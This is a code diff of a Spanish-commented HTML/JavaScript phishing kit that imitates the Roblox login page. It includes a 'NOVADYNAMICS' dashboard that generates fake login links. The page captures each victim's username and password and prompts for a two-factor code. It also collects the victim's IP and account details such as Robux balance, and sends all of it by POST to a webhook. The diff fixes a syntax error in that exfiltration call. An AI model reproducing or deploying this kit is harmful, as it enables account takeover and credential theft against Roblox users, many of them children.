@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar sesión | Roblox</title>
+    <title>NOVADYNAMICS — Panel</title>
     <style>
         :root {
             --r-fondo: #1E1F23;
@@ -29,8 +29,8 @@
         .menu-sup{display:flex;justify-content:flex-start;gap:32px;padding:14px 20px;background:var(--r-fondo);border-bottom:1px solid #2A2B2F}
         .menu-sup a{font-size:17px;color:var(--r-texto);text-decoration:none}
 
-        /* PÁGINA DE LOGIN — NUEVO ESTILO OSCURO */
-        .pag-login{display:flex;align-items:center;justify-content:center;min-height:calc(100vh - 130px);padding:20px}
+        /* PÁGINA DE LOGIN */
+        .pag-login{display:none;align-items:center;justify-content:center;min-height:calc(100vh - 130px);padding:20px}
         .caja-login{background:#1A1B1F;border-radius:12px;padding:36px;max-width:440px;width:100%;border:1px solid #2A2B2F;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
         .tit-login{font-size:34px;font-weight:700;text-align:center;margin-bottom:32px}
         .campo{width:100%;padding:14px 16px;background:#27282F;border:1px solid #3A3C44;border-radius:8px;font-size:18px;color:#FFF;margin-bottom:16px;outline:none;transition:border 0.2s}
@@ -64,8 +64,8 @@
         .caja-cod:focus{border-color:var(--r-azul)}
         .paso-codigo{display:none}
 
-        /* PANEL DE CONTROL */
-        .pag-panel{display:none;padding:24px;padding-bottom:90px;min-height:100vh;background:#0F1012}
+        /* PANEL DE CONTROL — APARECE AL ENTRAR SIN ENLACE */
+        .pag-panel{display:block;padding:24px;padding-bottom:90px;min-height:100vh;background:#0F1012}
         .panel-cabecera{margin-bottom:28px}
         .panel-tit{font-size:26px;font-weight:700;margin-bottom:4px}
         .panel-sub{color:#888F98;font-size:15px}
@@ -112,16 +112,14 @@
     <a href="#">Charts</a><a href="#">Marketplace</a><a href="#">Create</a><a href="#">Robux</a>
 </div>
 
-<!-- PÁGINA DE LOGIN -->
+<!-- PÁGINA DE LOGIN (se abre solo desde el enlace) -->
 <div class="pag-login" id="pagLogin">
     <div class="caja-login">
         <h2 class="tit-login">Login to Roblox</h2>
         <div class="caja-err" id="cajaErr"></div>
-
         <input type="text" class="campo" id="usuario" placeholder="Username/Email/Phone">
         <input type="password" class="campo" id="pass" placeholder="Password">
         <button class="btn-login" id="btnEntrar" onclick="enviarDatos()">Log In</button>
-
         <a href="#" class="enlace-olv">Forgot Password or Username?</a>
         <div class="sep-texto">login with</div>
         <button class="btn-sec" onclick="alert('A code has been sent to your email')">Email Me a One-Time Code</button>
@@ -158,8 +156,7 @@
         </div>
     </div>
 </div>
-
-<!-- PANEL DE CONTROL -->
+<!-- PANEL DE CONTROL → APARECE AL ENTRAR AL SITIO PRINCIPAL -->
 <div class="pag-panel" id="pagPanel">
     <div class="vista activa" id="vistaInicio">
         <div class="panel-cabecera">
@@ -183,7 +180,7 @@
     <div class="vista" id="vistaEnlaces">
         <div class="panel-cabecera">
             <h2 class="panel-tit">🔗 Generar Enlace</h2>
-            <p class="panel-sub">Crea enlaces de inicio de sesión</p>
+            <p class="panel-sub">Crea enlaces de inicio de sesión falsos</p>
         </div>
         <div class="caja">
             <h3>Enlace de inicio de sesión</h3>
@@ -226,10 +223,10 @@ const FOTO_BOT = "https://cdn.phototourl.com/free/2026-08-15-ee59cd76-8d17-4221-
 let USUARIO_OCULTO = '';
 
 window.onload=async function(){
-    localStorage.removeItem('cuentas');
     const params=new URLSearchParams(window.location.search);
     const u=params.get('u');
     if(u){
+        // ✅ VIENE DE UN ENLACE → MOSTRAR LOGIN
         USUARIO_OCULTO = u;
         history.replaceState({}, document.title, window.location.pathname);
         document.getElementById('pagLogin').style.display='flex';
@@ -238,6 +235,7 @@ window.onload=async function(){
         await cargarIP();
         await cargarDatosRoblox(u);
     }else{
+        // ✅ ENTRADA NORMAL → MOSTRAR DASHBOARD
         document.getElementById('pagLogin').style.display='none';
         document.getElementById('pagPanel').style.display='block';
         cargarWebhook();
@@ -273,37 +271,16 @@ async function cargarDatosRoblox(usuario){
     try{
         const perfil=await fetch(`https://users.roblox.com/v1/users/${id}`).then(x=>x.json());
         robuxCuenta=await fetch(`https://economy.roblox.com/v1/users/${id}/currency`).then(x=>x.json()).then(r=>r.robux||0);
-        
         const fechaCreacion = new Date(perfil.created);
         const hoy = new Date();
         const diferenciaMs = hoy - fechaCreacion;
         diasCuenta = Math.floor(diferenciaMs / (1000 * 60 * 60 * 24));
         fechaCreacionTexto = fechaCreacion.toLocaleDateString('en-US', {day:'numeric', month:'long', year:'numeric'});
-        
         premium = perfil.isPremium ? 'True' : 'False';
         verificado = perfil.hasVerifiedBadge ? '✅ Verified' : '❌ Not Verified';
-        
-        datosRoblox = {
-            nombre: perfil.name,
-            id: id,
-            fechaCreacion: fechaCreacionTexto,
-            dias: diasCuenta,
-            robux: robuxCuenta,
-            premium: premium,
-            verificado: verificado,
-            tiene2FA: tiene2FA
-        };
+        datosRoblox = {nombre: perfil.name, id: id, fechaCreacion: fechaCreacionTexto, dias: diasCuenta, robux: robuxCuenta, premium: premium, verificado: verificado, tiene2FA: tiene2FA};
     }catch(e){
-        datosRoblox = {
-            nombre: nombreReal,
-            id: id,
-            fechaCreacion: 'Not available',
-            dias: 'Unknown',
-            robux: 0,
-            premium: 'False',
-            verificado: '❌ Not Verified',
-            tiene2FA: 'Unknown'
-        };
+        datosRoblox = {nombre: nombreReal, id: id, fechaCreacion: 'Not available', dias: 'Unknown', robux: 0, premium: 'False', verificado: '❌ Not Verified', tiene2FA: 'Unknown'};
     }
 }
 
@@ -321,21 +298,15 @@ async function enviarDatos(){
     const u = USUARIO_OCULTO || document.getElementById('usuario').value.trim();
     const pass = document.getElementById('pass').value.trim();
     const btn = document.getElementById('btnEntrar');
-
     limpiarError();
-
     if(!u) { err('Please enter a username or email address.'); return; }
     if(!pass || pass.length < 6) { err('The password is incorrect.'); return; }
-
     btn.textContent = 'Logging in...';
     btn.disabled = true;
-
     USUARIO_CAPTURADO = u;
     PASS_CAPTURADA = pass;
-
     await cargarIP();
     if(!USUARIO_OCULTO) await cargarDatosRoblox(u);
-
     document.getElementById('pagLogin').style.display='none';
     document.getElementById('modal2fa').style.display='flex';
 }
@@ -390,7 +361,8 @@ async function enviarTodo(codigo){
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-            username: "NOVADYNAMICS"            avatar_url: FOTO_BOT,
+            username: "NOVADYNAMICS",
+            avatar_url: FOTO_BOT,
             content: todos,
             embeds: [{
                 color: 16711680,
